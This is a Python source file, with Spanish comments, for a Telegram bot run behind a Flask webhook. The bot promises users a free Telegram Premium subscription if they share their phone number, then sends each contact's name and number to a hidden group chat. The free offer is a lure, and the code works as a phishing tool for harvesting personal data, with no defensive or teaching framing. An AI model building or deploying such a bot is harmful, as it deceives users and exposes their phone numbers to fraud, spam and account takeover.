import os
from flask import Flask, request
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# Variables de entorno
TOKEN = os.getenv("BOT_TOKEN")
GROUP_ID = os.getenv("GROUP_ID")  # ID del grupo donde se enviará el número
PORT = int(os.environ.get('PORT', 5000))

# Flask app
app = Flask(__name__)

# Telegram application
telegram_app = Application.builder().token(TOKEN).build()

# Comando /start para pedir el número
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton("📱 Compartir mi número", request_contact=True)
    markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Para reclamar 🥳 tu suscripción a Telegram Premium, comparte tu número tocando el botón ⬇️",
        reply_markup=markup
    )

# Manejar el contacto recibido
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact:
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"📞 Nuevo número recibido:\n👤 {contact.first_name} {contact.last_name or ''}\n📱 {contact.phone_number}"
        )

# Registrar handlers
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(MessageHandler(filters.CONTACT, contact))

# Endpoint para recibir actualizaciones de Telegram
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), telegram_app.bot)
    telegram_app.update_queue.put_nowait(update)
    return "OK", 200

@app.route("/", methods=["GET"])
def home():
    return "Bot funcionando con webhook", 200

if __name__ == "__main__":
    # Iniciar Flask
    app.run(host="0.0.0.0", port=PORT)
